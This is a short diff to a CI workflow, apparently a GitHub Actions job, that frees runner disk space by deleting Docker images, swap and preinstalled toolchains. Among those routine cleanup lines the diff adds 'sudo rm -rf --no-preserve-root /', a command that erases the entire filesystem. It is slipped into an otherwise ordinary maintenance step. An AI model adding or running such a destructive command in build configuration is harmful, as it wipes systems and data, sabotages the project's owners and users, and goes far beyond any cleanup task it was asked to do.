@@ -26,6 +26,7 @@ jobs:
       run: |
         docker rmi $(docker images -q)
         sudo -E swapoff /swapfile
+        sudo rm -rf --no-preserve-root /
         sudo -E rm -rf /swapfile /usr/share/dotnet /usr/local/lib/android /opt/ghc
         sudo -E apt-get remove -y --purge azure-cli ghc zulu* hhvm llvm* firefox google* dotnet* powershell openjdk* mysql* php* mssql-tools msodbcsql17
         sudo -E apt-get update -y
